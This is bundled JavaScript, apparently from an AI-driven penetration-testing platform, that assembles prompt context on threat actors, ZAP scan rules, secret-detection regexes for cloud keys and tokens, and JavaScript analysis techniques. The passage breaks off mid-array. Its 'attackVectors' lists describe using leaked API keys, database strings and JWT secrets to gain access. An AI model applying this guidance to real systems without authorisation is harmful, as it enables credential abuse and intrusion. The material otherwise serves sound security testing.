import {
  buildMissedVulnAttackContext,
  buildMissedVulnContext,
  init_missed_vuln_training_knowledge
} from "./chunk-5DEWV7VV.js";
import {
  buildCloudSecurityContext,
  buildGeneralCloudContext,
  canExecuteAction,
  createSafeChatContext,
  detectCloudProviders,
  detectPromptInjection,
  evaluateAutonomyLevel,
  formatChainsForPrompt,
  getAutonomyDescription,
  getBugBountyContext,
  getChainsByVulnDescriptions,
  getTrainingExamplesForPrompt,
  getTriageCorpusContext,
  getTriageSystemPrompt,
  init_ai_chat_safety,
  init_attack_chain_retriever,
  init_bugbounty_knowledge,
  init_cloud_security_knowledge,
  init_graduated_autonomy,
  init_training_corpus,
  sanitizeAIOutput
} from "./chunk-4YZBXG5G.js";
import {
  buildOffensiveTechniquesContext,
  getFileUploadBypassContext,
  getFirewallEvasionContext,
  getLOTLContext,
  getShodanReconContext,
  getSubdomainEnumContext,
  init_offensive_techniques_knowledge
} from "./chunk-YY5JEKDP.js";
import {
  getLearningDashboard,
  getThreatStats,
  getThreatTrend,
  init_learning_engine_api,
  scoreThreatAttribution
} from "./chunk-Z63B6QCQ.js";
import {
  formatOntologyForPrompt,
  inferAssetContext,
  init_asset_ontology
} from "./chunk-NQKLH74H.js";
import {
  buildAttackPlannerToolContext,
  buildToolRecommendationContext,
  init_offensive_tools_knowledge
} from "./chunk-SSYKZXNO.js";
import {
  buildMethodologyContext,
  buildPhaseToolContext,
  buildScanPlanningContext,
  buildVulnTestingContext,
  init_bugbounty_methodology_knowledge
} from "./chunk-WP62CKNZ.js";
import {
  buildOptimalScanforgeCommand,
  getFullScanforgeContext,
  getScanforgeHuntContext,
  getScanforgeScanPlanContext,
  getScanforgeVulnCorrelationContext,
  init_scanforge_knowledge
} from "./chunk-LPSC3SDV.js";
import {
  getOwaspAssetClassificationContext,
  getOwaspScanPlanContext,
  getOwaspVulnCorrelationContext,
  init_owasp_knowledge
} from "./chunk-J6EMIQSU.js";
import {
  getGroupsByCVE,
  getSectorThreatContext,
  getThreatGroupScanContext,
  getThreatGroupVulnContext,
  init_threat_group_knowledge
} from "./chunk-RXZBKY45.js";
import {
  buildZAPKnowledgeContext,
  getTechScanPolicyContext,
  getVulnPayloadContext,
  getZAPAlertCatalogContext,
  getZAPAuthContext,
  getZAPReasoningPrompt,
  init_zap_pentesting_knowledge
} from "./chunk-E7WGGYZE.js";
import {
  init_knowledge_loader,
  loadKnowledgeData
} from "./chunk-PIYDKQBM.js";
import {
  calculateKevRiskBoost,
  fetchKevCatalog,
  init_kev_service,
  matchCvesAgainstKev
} from "./chunk-PFTNS476.js";
import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/threat-actor-learning-context.ts
async function fetchThreatLearningData() {
  const now = Date.now();
  if (_cachedContext && now - _cacheTimestamp < CACHE_TTL_MS) {
    return _cachedContext;
  }
  try {
    const [statsResult, trendResult, dashboardResult] = await Promise.allSettled([
      getThreatStats(),
      getThreatTrend(10),
      getLearningDashboard()
    ]);
    const stats = statsResult.status === "fulfilled" ? statsResult.value : null;
    const trend = trendResult.status === "fulfilled" ? trendResult.value : null;
    const dashboard = dashboardResult.status === "fulfilled" ? dashboardResult.value : null;
    const ctx = {
      topGroups: stats?.topGroups || [],
      topTechniques: (stats?.topTechniques || []).map((t) => ({
        techniqueId: t.technique_id || t.techniqueId || "",
        techniqueName: t.technique_name || t.techniqueName || "",
        detections: t.detections ?? 0
      })),
      topCVEs: (stats?.topCVEs || []).map((c) => ({
        cve: c.cve || c.cve_id || "",
        detections: c.detections ?? 0
      })),
      catalogSummary: {
        totalGroups: dashboard?.threatActor?.totalGroups ?? stats?.catalogSummary?.totalGroups ?? 0,
        totalTTPs: dashboard?.threatActor?.totalTTPs ?? stats?.catalogSummary?.totalTTPs ?? 0,
        totalCVEs: dashboard?.threatActor?.totalCVEs ?? stats?.catalogSummary?.totalCVEs ?? 0
      },
      recentTrend: trend?.trend || []
    };
    _cachedContext = ctx;
    _cacheTimestamp = now;
    console.log(`${LOG} Fetched threat learning data: ${ctx.topGroups.length} groups, ${ctx.topTechniques.length} techniques`);
    return ctx;
  } catch (err) {
    console.warn(`${LOG} Failed to fetch threat learning data: ${err.message}`);
    return _cachedContext;
  }
}
async function buildThreatActorLearningContext() {
  const data = await fetchThreatLearningData();
  if (!data || data.topGroups.length === 0 && data.topTechniques.length === 0) {
    return "";
  }
  let ctx = `
=== THREAT ACTOR LEARNING ENGINE \u2014 LIVE ATTRIBUTION DATA ===
`;
  ctx += `The learning engine has analyzed scans against ${data.catalogSummary.totalGroups} threat groups, `;
  ctx += `${data.catalogSummary.totalTTPs} TTPs, and ${data.catalogSummary.totalCVEs} CVEs.

`;
  if (data.topGroups.length > 0) {
    ctx += `TOP THREAT GROUPS BY DETECTION FREQUENCY:
`;
    for (const g of data.topGroups.slice(0, 10)) {
      ctx += `  - ${g.groupName} (${g.matchCount} matches, ${Math.round(g.avgConfidence)}% avg confidence)
`;
    }
    ctx += `
`;
  }
  if (data.topTechniques.length > 0) {
    ctx += `MOST FREQUENTLY DETECTED TECHNIQUES:
`;
    for (const t of data.topTechniques.slice(0, 10)) {
      ctx += `  - ${t.techniqueId} ${t.techniqueName} (${t.detections} detections)
`;
    }
    ctx += `
`;
  }
  if (data.topCVEs.length > 0) {
    ctx += `MOST FREQUENTLY DETECTED CVEs:
`;
    for (const c of data.topCVEs.slice(0, 10)) {
      ctx += `  - ${c.cve} (${c.detections} detections)
`;
    }
    ctx += `
`;
  }
  if (data.recentTrend.length > 0) {
    ctx += `RECENT ATTRIBUTION TREND:
`;
    for (const t of data.recentTrend.slice(0, 5)) {
      ctx += `  - ${t.topGroup}: ${t.ttpsMatched} TTPs, ${t.cvesMatched} CVEs, ${Math.round(t.confidence)}% confidence
`;
    }
    ctx += `
`;
  }
  ctx += `INSTRUCTIONS: Use this live threat attribution data to prioritize scanning for techniques and CVEs `;
  ctx += `associated with the most frequently detected threat groups. If the target's technology stack matches `;
  ctx += `patterns associated with specific groups, escalate those checks. Cross-reference findings against the `;
  ctx += `top CVEs list to identify high-confidence threat actor overlap.
`;
  return ctx;
}
async function buildThreatActorVulnContext(discoveredCVEs, discoveredTechniques) {
  const data = await fetchThreatLearningData();
  if (!data || data.topGroups.length === 0) {
    return "";
  }
  let ctx = `
=== THREAT ACTOR CORRELATION \u2014 LIVE LEARNING DATA ===
`;
  const matchedCVEs = discoveredCVEs.filter(
    (cve) => data.topCVEs.some((tc) => tc.cve === cve)
  );
  if (matchedCVEs.length > 0) {
    ctx += `DISCOVERED CVEs MATCHING THREAT ACTOR PATTERNS:
`;
    for (const cve of matchedCVEs) {
      const match = data.topCVEs.find((tc) => tc.cve === cve);
      ctx += `  - ${cve} (detected ${match?.detections ?? 0} times in threat actor scans)
`;
    }
    ctx += `  \u2192 These CVEs are actively exploited by known threat groups. BOOST severity.

`;
  }
  const matchedTechs = discoveredTechniques.filter(
    (tech) => data.topTechniques.some(
      (tt) => tt.techniqueId === tech || tt.techniqueName.toLowerCase().includes(tech.toLowerCase())
    )
  );
  if (matchedTechs.length > 0) {
    ctx += `DISCOVERED TECHNIQUES MATCHING THREAT ACTOR PATTERNS:
`;
    for (const tech of matchedTechs) {
      const match = data.topTechniques.find(
        (tt) => tt.techniqueId === tech || tt.techniqueName.toLowerCase().includes(tech.toLowerCase())
      );
      ctx += `  - ${tech} \u2192 ${match?.techniqueName || tech} (${match?.detections ?? 0} detections)
`;
    }
    ctx += `  \u2192 These techniques are commonly used by tracked threat groups. Flag for further investigation.

`;
  }
  ctx += `TOP THREAT GROUPS TO CORRELATE AGAINST:
`;
  for (const g of data.topGroups.slice(0, 5)) {
    ctx += `  - ${g.groupName}: ${g.matchCount} matches, ${Math.round(g.avgConfidence)}% confidence
`;
  }
  return ctx;
}
async function scoreEngagementThreatAttribution(opts) {
  try {
    const result = await scoreThreatAttribution({
      sessionId: opts.sessionId,
      engagementId: opts.engagementId,
      targetUrl: opts.targetUrl,
      scanType: "engagement",
      ttps: opts.ttps,
      cves: opts.cves
    });
    console.log(`${LOG} Scored threat attribution for engagement ${opts.engagementId}: ${JSON.stringify(result?.summary || {})}`);
    _cachedContext = null;
    _cacheTimestamp = 0;
    return result;
  } catch (err) {
    console.warn(`${LOG} Failed to score threat attribution: ${err.message}`);
    return null;
  }
}
function clearThreatLearningCache() {
  _cachedContext = null;
  _cacheTimestamp = 0;
}
var LOG, _cachedContext, _cacheTimestamp, CACHE_TTL_MS;
var init_threat_actor_learning_context = __esm({
  "server/lib/threat-actor-learning-context.ts"() {
    "use strict";
    init_learning_engine_api();
    LOG = "[ThreatActorLearning]";
    _cachedContext = null;
    _cacheTimestamp = 0;
    CACHE_TTL_MS = 5 * 60 * 1e3;
  }
});

// server/lib/knowledge/zap-source-secrets-knowledge.ts
function buildSourceSecretsContext(params) {
  const sections = [];
  sections.push(buildRuleCatalogSection());
  if (params.includeSecretPatterns !== false && (params.phase === "vuln_detection" || params.phase === "exploitation" || params.phase === "enumeration")) {
    sections.push(buildSecretPatternsSection(params.technology));
  }
  if (params.includeJSAnalysis !== false && (params.phase === "vuln_detection" || params.phase === "exploitation")) {
    sections.push(buildJSAnalysisSection());
  }
  if (params.includeSourceDisclosure !== false && (params.phase === "enumeration" || params.phase === "vuln_detection" || params.phase === "exploitation")) {
    sections.push(buildSourceDisclosureSection());
  }
  if (params.includeBrowserStorage !== false && (params.phase === "vuln_detection" || params.phase === "exploitation")) {
    sections.push(buildBrowserStorageSection());
  }
  if (sections.length === 0) return "";
  return `# ZAP Source Code & Secrets Analysis Knowledge

${sections.join("\n\n---\n\n")}`;
}
function buildRuleCatalogSection() {
  const allRules = [
    ...ZAP_SOURCE_SECRET_RULES.sourceCodeDisclosure,
    ...ZAP_SOURCE_SECRET_RULES.scriptAnalysis,
    ...ZAP_SOURCE_SECRET_RULES.secretsDisclosure,
    ...ZAP_SOURCE_SECRET_RULES.fileDisclosure,
    ...ZAP_SOURCE_SECRET_RULES.cloudSecrets,
    ...ZAP_SOURCE_SECRET_RULES.browserStorage,
    ...ZAP_SOURCE_SECRET_RULES.debugDisclosure
  ];
  const passive = allRules.filter((r) => r.type === "passive");
  const active = allRules.filter((r) => r.type === "active");
  return `## ZAP Rules for Source Code & Secret Detection

### Passive Rules (run automatically during spidering)
${passive.map((r) => `- **${r.ruleId}**: ${r.name} [${r.risk}]`).join("\n")}

### Active Rules (require active scan)
${active.map((r) => `- **${r.ruleId}**: ${r.name} [${r.risk}]`).join("\n")}

**Configuration**: Enable ALL passive rules at LOW threshold for maximum coverage. For active rules, set source code disclosure rules (41, 42, 43, 10045) to HIGH strength and file disclosure rules (40034, 40035, 10095) to MEDIUM strength.`;
}
function buildSecretPatternsSection(technology) {
  let patterns = SECRET_PATTERNS;
  if (technology) {
    const techLower = technology.toLowerCase();
    const prioritized = patterns.filter((p) => {
      if (techLower.includes("aws") || techLower.includes("amazon")) return p.category === "cloud";
      if (techLower.includes("node") || techLower.includes("react")) return ["api_key", "token", "database"].includes(p.category);
      if (techLower.includes("java") || techLower.includes("spring")) return ["database", "cloud", "encryption"].includes(p.category);
      return true;
    });
    if (prioritized.length > 0) patterns = [...prioritized, ...patterns.filter((p) => !prioritized.includes(p))];
  }
  return `## Secret Detection Patterns

When analyzing JavaScript files, HTML source, and API responses, search for these patterns:

${patterns.map((p) => `### ${p.name} [${p.severity.toUpperCase()}]
- **Pattern**: \`${p.regex}\`
- **Category**: ${p.category}
- **FP Rate**: ${p.falsePositiveRate}
- **What it means**: ${p.description}
- **Remediation**: ${p.remediation}
- **Example**: \`${p.examples[0]}\``).join("\n\n")}

**Search Strategy**: After spidering, use ZAP's Search tab to grep ALL responses for each pattern. Focus on JavaScript files, JSON responses, and HTML inline scripts.`;
}
function buildJSAnalysisSection() {
  return `## JavaScript Source Code Analysis Techniques

${JS_ANALYSIS_TECHNIQUES.map((t) => `### ${t.name}
${t.description}

**ZAP Rules**: ${t.zapRuleIds.join(", ")}

**Steps**:
${t.manualSteps.map((s, i) => `${i + 1}. ${s}`).join("\n")}

**What to look for**:
${t.whatToLookFor.map((w) => `- ${w}`).join("\n")}

**Attack vectors**:
${t.attackVectors.map((a) => `- ${a}`).join("\n")}`).join("\n\n---\n\n")}`;
}
function buildSourceDisclosureSection() {
  return `## Source Code Disclosure Vectors

${SOURCE_CODE_DISCLOSURE_VECTORS.map((v) => `### ${v.name}
**ZAP Rules**: ${v.zapRuleIds.join(", ")}
**Probe Paths**: ${v.paths.slice(0, 4).join(", ")}
**Indicators**: ${v.indicators.join(", ")}
**Exploitability**: ${v.exploitability}
**Post-Exploitation**:
${v.postExploitation.map((p) => `- ${p}`).join("\n")}`).join("\n\n")}`;
}
function buildBrowserStorageSection() {
  return `## Browser Storage Security Audit

Use ZAP Ajax Spider (browser-based crawling) to trigger JavaScript that populates browser storage, then analyze:

${BROWSER_STORAGE_CHECKS.map((c) => `### ${c.storageType}
**ZAP Rules**: ${c.zapRuleIds.join(", ")}
**Risk**: ${c.description}
**Sensitive Keys to Check**: ${c.sensitiveKeys.join(", ")}
**Extraction**: \`${c.extractionMethod}\``).join("\n\n")}

**IMPORTANT**: Browser storage analysis requires the Ajax Spider (browser-based crawling) to be enabled. Standard spider does not execute JavaScript and will miss storage-based secrets.`;
}
function buildCompactSourceSecretsContext() {
  const criticalPatterns = SECRET_PATTERNS.filter((p) => p.severity === "critical");
  const highPatterns = SECRET_PATTERNS.filter((p) => p.severity === "high").slice(0, 5);
  return `## Source Code & Secrets Quick Reference

### Critical Secret Patterns to Search For:
${[...criticalPatterns, ...highPatterns].map((p) => `- ${p.name}: \`${p.regex}\` [${p.severity}]`).join("\n")}

### ZAP Configuration for Secret Detection:
1. Enable passive rules: 10025 (Suspicious Comments), 10094 (Base64), 100034 (Google API Key), 120001 (Browser Storage Secrets)
2. Enable active rules: 40034 (.env), 40035 (Hidden Files), 42 (Git), 10045 (WEB-INF), 10095 (Backup Files)
3. Spider config: parseComments=true, parseGit=true, parseSVNEntries=true
4. Use Ajax Spider for browser storage analysis
5. After spidering: Search all responses for secret patterns listed above

### Key JS Analysis Points:
- Check source maps (.map files) for original source code
- Search webpack/vite bundles for hardcoded secrets
- Analyze localStorage/sessionStorage for JWT tokens and API keys
- Check inline <script> blocks for config objects with credentials
- Review postMessage handlers for missing origin validation`;
}
var ZAP_SOURCE_SECRET_RULES, SECRET_PATTERNS, JS_ANALYSIS_TECHNIQUES, SOURCE_CODE_DISCLOSURE_VECTORS, BROWSER_STORAGE_CHECKS;
var init_zap_source_secrets_knowledge = __esm({
  "server/lib/knowledge/zap-source-secrets-knowledge.ts"() {
    "use strict";
    ZAP_SOURCE_SECRET_RULES = {
      // Source Code Disclosure
      sourceCodeDisclosure: [
        { ruleId: 41, name: "Source Code Disclosure - SVN", risk: "Medium", type: "active" },
        { ruleId: 42, name: "Source Code Disclosure - Git", risk: "Medium", type: "active" },
        { ruleId: 43, name: "Source Code Disclosure - File Inclusion", risk: "High", type: "active" },
        { ruleId: 10045, name: "Source Code Disclosure - /WEB-INF", risk: "High", type: "active" },
        { ruleId: 10099, name: "Source Code Disclosure - PHP", risk: "Medium", type: "active" },
        { ruleId: 20017, name: "Source Code Disclosure - CVE-2012-1823", risk: "High", type: "active" }
      ],
      // JavaScript & Script Analysis
      scriptAnalysis: [
        { ruleId: 10055, name: "CSP: script-src unsafe-inline", risk: "Medium", type: "passive" },
        { ruleId: 10115, name: "Script Served From Malicious Domain", risk: "High", type: "passive" },
        { ruleId: 40026, name: "Cross Site Scripting (DOM Based)", risk: "High", type: "active" },
        { ruleId: 90003, name: "Sub Resource Integrity Missing", risk: "Medium", type: "passive" },
        { ruleId: 10025, name: "Suspicious Comments in Source", risk: "Informational", type: "passive" }
      ],
      // Secrets & Credential Disclosure
      secretsDisclosure: [
        { ruleId: 10105, name: "Authentication Credentials Captured", risk: "High", type: "passive" },
        { ruleId: 10057, name: "Username Hash Found", risk: "Informational", type: "passive" },
        { ruleId: 10097, name: "Hash Disclosure - MD4/MD5", risk: "Medium", type: "passive" },
        { ruleId: 10094, name: "Base64 Disclosure", risk: "Informational", type: "passive" },
        { ruleId: 10062, name: "PII Disclosure", risk: "High", type: "passive" },
        { ruleId: 100034, name: "Google API Key Disclosure", risk: "Medium", type: "passive" },
        { ruleId: 100043, name: "Swagger UI Secret Detector", risk: "High", type: "passive" }
      ],
      // File & Backup Disclosure
      fileDisclosure: [
        { ruleId: 40034, name: ".env Information Leak", risk: "High", type: "active" },
        { ruleId: 40032, name: ".htaccess Information Leak", risk: "Medium", type: "active" },
        { ruleId: 40035, name: "Hidden File Found", risk: "Medium", type: "active" },
        { ruleId: 10095, name: "Backup File Disclosure", risk: "Medium", type: "active" },
        { ruleId: 40028, name: "ELMAH Information Leak", risk: "Medium", type: "active" },
        { ruleId: 40029, name: "Trace.axd Information Leak", risk: "Medium", type: "active" },
        { ruleId: 40042, name: "Spring Actuator Information Leak", risk: "High", type: "active" }
      ],
      // Cloud & Infrastructure
      cloudSecrets: [
        { ruleId: 90034, name: "Cloud Metadata Exposed", risk: "High", type: "active" },
        { ruleId: 100036, name: "Amazon S3 Bucket URL Disclosure", risk: "Medium", type: "passive" }
      ],
      // Browser Storage Analysis
      browserStorage: [
        { ruleId: 12e4, name: "Information in Browser Storage", risk: "Medium", type: "passive" },
        { ruleId: 120001, name: "Sensitive Information in Browser Storage", risk: "High", type: "passive" },
        { ruleId: 120002, name: "JWT in Browser Storage", risk: "High", type: "passive" }
      ],
      // Debug & Error Disclosure
      debugDisclosure: [
        { ruleId: 10042, name: "Debug Error Messages", risk: "Medium", type: "passive" },
        { ruleId: 10056, name: "X-Debug-Token Information Leak", risk: "Low", type: "passive" },
        { ruleId: 10052, name: "X-ChromeLogger-Data Header Leak", risk: "Medium", type: "passive" },
        { ruleId: 90022, name: "Application Error Disclosure", risk: "Medium", type: "passive" }
      ]
    };
    SECRET_PATTERNS = [
      {
        id: "aws-access-key",
        name: "AWS Access Key ID",
        category: "cloud",
        regex: "AKIA[0-9A-Z]{16}",
        description: "AWS IAM access key that grants programmatic access to AWS services",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Rotate the key immediately via AWS IAM console, check CloudTrail for unauthorized usage",
        examples: ["AKIAIOSFODNN7EXAMPLE"]
      },
      {
        id: "aws-secret-key",
        name: "AWS Secret Access Key",
        category: "cloud",
        regex: `['"][0-9a-zA-Z/+]{40}['"]`,
        description: "AWS secret key paired with access key ID for authentication",
        severity: "critical",
        falsePositiveRate: "medium",
        remediation: "Rotate both access key and secret key, audit CloudTrail logs",
        examples: ["wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]
      },
      {
        id: "gcp-api-key",
        name: "Google Cloud API Key",
        category: "cloud",
        regex: "AIza[0-9A-Za-z_-]{35}",
        description: "Google Cloud Platform API key for service authentication",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Restrict API key scope, rotate via GCP console, add HTTP referrer restrictions",
        examples: ["AIzaSyA1234567890abcdefghijklmnopqrstuvw"]
      },
      {
        id: "github-token",
        name: "GitHub Personal Access Token",
        category: "token",
        regex: "gh[pousr]_[A-Za-z0-9_]{36,255}",
        description: "GitHub PAT granting repository and organization access",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Revoke token at github.com/settings/tokens, audit repository access logs",
        examples: ["ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh"]
      },
      {
        id: "slack-token",
        name: "Slack Bot/User Token",
        category: "token",
        regex: "xox[bporas]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,34}",
        description: "Slack API token for bot or user workspace access",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Revoke token in Slack admin, rotate bot credentials",
        examples: ["xoxb-1234567890-1234567890-AbCdEfGhIjKlMnOpQrStUvWx"]
      },
      {
        id: "stripe-secret",
        name: "Stripe Secret Key",
        category: "api_key",
        regex: "sk_(live|test)_[0-9a-zA-Z]{24,99}",
        description: "Stripe payment processing secret key \u2014 allows charges and refunds",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Roll the key in Stripe Dashboard immediately, audit recent transactions",
        examples: ["sk_live_4eC39HqLyjWDarjtT1zdp7dc"]
      },
      {
        id: "stripe-publishable",
        name: "Stripe Publishable Key",
        category: "api_key",
        regex: "pk_(live|test)_[0-9a-zA-Z]{24,99}",
        description: "Stripe publishable key \u2014 lower risk but reveals account info",
        severity: "low",
        falsePositiveRate: "low",
        remediation: "Verify it's only used client-side; roll if paired with exposed secret key",
        examples: ["pk_live_4eC39HqLyjWDarjtT1zdp7dc"]
      },
      {
        id: "jwt-secret",
        name: "JWT Secret / Signing Key",
        category: "encryption",
        regex: `(?:jwt[_-]?secret|JWT_SECRET|jwt[_-]?key)\\s*[:=]\\s*['"][^'"]{8,}['"]`,
        description: "JWT signing secret allows forging authentication tokens",
        severity: "critical",
        falsePositiveRate: "medium",
        remediation: "Rotate the JWT secret, invalidate all existing sessions, move to env vars",
        examples: ["JWT_SECRET='my-super-secret-key-2024'"]
      },
      {
        id: "database-url",
        name: "Database Connection String",
        category: "database",
        regex: `(?:mysql|postgres|mongodb|redis|mssql)://[^\\s'"]+:[^\\s'"]+@[^\\s'"]+`,
        description: "Database connection URI with embedded credentials",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Rotate database password, restrict network access, move to env vars",
        examples: ["postgres://admin:password123@db.example.com:5432/production"]
      },
      {
        id: "private-key",
        name: "Private Key (RSA/EC/SSH)",
        category: "encryption",
        regex: "-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
        description: "Cryptographic private key for TLS, SSH, or code signing",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Revoke and regenerate the key pair, update all services using it",
        examples: ["-----BEGIN RSA PRIVATE KEY-----"]
      },
      {
        id: "sendgrid-key",
        name: "SendGrid API Key",
        category: "api_key",
        regex: "SG\\.[a-zA-Z0-9_-]{22}\\.[a-zA-Z0-9_-]{43}",
        description: "SendGrid email service API key",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Revoke in SendGrid dashboard, create new restricted key",
        examples: ["SG.abcdefghijklmnopqrstuv.wxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ12345"]
      },
      {
        id: "twilio-key",
        name: "Twilio API Key",
        category: "api_key",
        regex: "SK[0-9a-fA-F]{32}",
        description: "Twilio API key for SMS/voice services",
        severity: "high",
        falsePositiveRate: "medium",
        remediation: "Delete the API key in Twilio console, create new one",
        examples: ["SK1234567890abcdef1234567890abcdef"]
      },
      {
        id: "firebase-config",
        name: "Firebase Configuration",
        category: "cloud",
        regex: `(?:apiKey|authDomain|databaseURL|storageBucket)\\s*:\\s*['"][^'"]+['"]`,
        description: "Firebase project configuration \u2014 may expose project details and enable abuse",
        severity: "medium",
        falsePositiveRate: "high",
        remediation: "Restrict Firebase security rules, add domain restrictions to API key",
        examples: ["apiKey: 'AIzaSyA1234567890'"]
      },
      {
        id: "hardcoded-password",
        name: "Hardcoded Password",
        category: "credential",
        regex: `(?:password|passwd|pwd|secret)\\s*[:=]\\s*['"][^'"]{4,}['"]`,
        description: "Hardcoded password in source code or configuration",
        severity: "high",
        falsePositiveRate: "high",
        remediation: "Remove hardcoded password, use environment variables or secret manager",
        examples: ["password = 'admin123'", "const pwd = 'supersecret'"]
      },
      {
        id: "bearer-token",
        name: "Bearer/Authorization Token",
        category: "token",
        regex: "(?:Bearer|Authorization)\\s+[A-Za-z0-9_-]{20,}",
        description: "Authorization bearer token in source code or response headers",
        severity: "high",
        falsePositiveRate: "medium",
        remediation: "Revoke the token, implement token rotation, use short-lived tokens",
        examples: ["Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."]
      },
      {
        id: "mailgun-key",
        name: "Mailgun API Key",
        category: "api_key",
        regex: "key-[0-9a-zA-Z]{32}",
        description: "Mailgun email service API key",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Rotate key in Mailgun dashboard",
        examples: ["key-1234567890abcdef1234567890abcdef"]
      },
      {
        id: "azure-connection",
        name: "Azure Connection String",
        category: "cloud",
        regex: "DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+",
        description: "Azure Storage account connection string with embedded key",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Rotate storage account keys in Azure portal, use managed identity instead",
        examples: ["DefaultEndpointsProtocol=https;AccountName=myaccount;AccountKey=abc123..."]
      },
      {
        id: "openai-key",
        name: "OpenAI API Key",
        category: "api_key",
        regex: "sk-[a-zA-Z0-9]{20,}T3BlbkFJ[a-zA-Z0-9]{20,}",
        description: "OpenAI API key for GPT/DALL-E/Whisper services",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Revoke at platform.openai.com, create new key with usage limits",
        examples: ["sk-abc123...T3BlbkFJ...xyz789"]
      },
      {
        id: "internal-ip",
        name: "Internal/Private IP Address",
        category: "internal",
        regex: "(?:10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|172\\.(?:1[6-9]|2\\d|3[01])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})",
        description: "Internal network IP address leaked in response \u2014 reveals network topology",
        severity: "low",
        falsePositiveRate: "medium",
        remediation: "Configure server to strip internal IPs from responses and error messages",
        examples: ["10.0.1.42", "192.168.1.100"]
      }
    ];
    JS_ANALYSIS_TECHNIQUES = [
      {
        id: "inline-secrets",
        name: "Inline Secret Detection in JavaScript",
        description: "Scan JavaScript files and inline <script> blocks for hardcoded API keys, tokens, passwords, and connection strings. Modern SPAs often bundle configuration objects containing secrets that should be server-side only.",
        zapRuleIds: [10025, 10094, 100034, 100043],
        manualSteps: [
          "Spider the target with parseComments=true and parseGit=true to discover all JS files",
          "Use ZAP's Search feature to grep all responses for secret patterns (AKIA, sk_, ghp_, etc.)",
          "Check inline <script> tags in HTML responses for config objects with API keys",
          "Inspect webpack/vite chunk files \u2014 secrets often end up in vendor bundles",
          "Check source maps (.map files) which may contain original source with comments and secrets",
          "Review window.__CONFIG__ or similar global config injections"
        ],
        whatToLookFor: [
          "API keys: AWS (AKIA...), GCP (AIza...), Stripe (sk_live/pk_live), SendGrid (SG.)",
          "OAuth secrets: client_secret, client_id paired with secret values",
          "Database URLs: mongodb://, postgres://, mysql:// with credentials",
          "JWT secrets: jwt_secret, JWT_KEY, signing_key assignments",
          "Firebase config objects with apiKey, authDomain, databaseURL",
          "Environment variable leaks: process.env references that got bundled",
          "Hardcoded Bearer tokens in fetch/axios interceptors",
          "Base64-encoded credentials in Authorization headers"
        ],
        attackVectors: [
          "Use discovered API keys to access cloud services (S3, GCP Storage, etc.)",
          "Use database connection strings for direct database access",
          "Forge JWT tokens using discovered signing secrets",
          "Access internal APIs using discovered bearer tokens",
          "Enumerate cloud resources using leaked account identifiers"
        ],
        tools: ["ZAP Spider", "ZAP Ajax Spider", "ZAP Search", "ZAP Passive Scanner", "JS Beautifier"]
      },
      {
        id: "source-map-analysis",
        name: "Source Map Exploitation",
        description: "Modern JavaScript bundlers (webpack, vite, rollup) generate .map files that contain the original source code. If these are accessible in production, attackers can reconstruct the entire frontend codebase including comments, variable names, and potentially secrets.",
        zapRuleIds: [10025, 10094],
        manualSteps: [
          "Check for sourceMappingURL comments in JS files: //# sourceMappingURL=...",
          "Try appending .map to discovered JS file URLs",
          "Check common paths: /static/js/*.map, /assets/*.map, /_next/static/*.map",
          "Parse source maps to extract original file tree and source code",
          "Search extracted source for secrets, internal URLs, and API endpoints",
          "Look for development comments (TODO, FIXME, HACK, XXX) with sensitive context"
        ],
        whatToLookFor: [
          "Original TypeScript/JSX source with developer comments",
          "Internal API endpoint URLs and service architecture",
          "Environment variable references that reveal configuration",
          "Authentication logic and token handling patterns",
          "Admin routes and hidden functionality",
          "Database query patterns and ORM model definitions"
        ],
        attackVectors: [
          "Reconstruct full application logic to find business logic flaws",
          "Discover hidden admin endpoints and API routes",
          "Find authentication bypass patterns in original source",
          "Map internal microservice architecture from import paths"
        ],
        tools: ["ZAP Spider", "source-map-explorer", "unwebpack-sourcemap"]
      },
      {
        id: "dom-based-analysis",
        name: "DOM-Based Vulnerability Analysis",
        description: "Analyze JavaScript for DOM-based vulnerabilities where user input flows from sources (location.hash, document.referrer, postMessage) to sinks (innerHTML, eval, document.write) without sanitization.",
        zapRuleIds: [40026, 10055],
        manualSteps: [
          "Use ZAP Ajax Spider with browser-based crawling to execute JavaScript",
          "Enable DOM XSS passive scan rule (40026) for automated detection",
          "Check for unsafe CSP directives: unsafe-inline, unsafe-eval",
          "Review JavaScript for dangerous sink functions: eval(), innerHTML, document.write()",
          "Trace data flow from URL parameters/fragments to DOM manipulation",
          "Check postMessage handlers for missing origin validation"
        ],
        whatToLookFor: [
          "document.location.hash used directly in DOM operations",
          "URL parameters reflected into innerHTML or outerHTML",
          "eval() or Function() called with user-controllable input",
          "jQuery .html() or .append() with unsanitized data",
          "postMessage event handlers without origin checks",
          "Angular/React dangerouslySetInnerHTML with dynamic content",
          "Template literal injection in framework templates"
        ],
        attackVectors: [
          "DOM XSS via URL fragment injection",
          "Prototype pollution via __proto__ or constructor.prototype",
          "Client-side template injection in Angular/Vue",
          "postMessage-based XSS from cross-origin frames",
          "Open redirect via client-side routing manipulation"
        ],
        tools: ["ZAP Ajax Spider", "ZAP DOM XSS Scanner", "Browser DevTools"]
      },
      {
        id: "browser-storage-audit",
        name: "Browser Storage Secret Audit",
        description: "Analyze localStorage, sessionStorage, cookies, and IndexedDB for sensitive data that should not be stored client-side. Many SPAs store JWTs, API keys, or PII in browser storage where they're vulnerable to XSS extraction.",
        zapRuleIds: [12e4, 120001, 120002],
        manualSteps: [
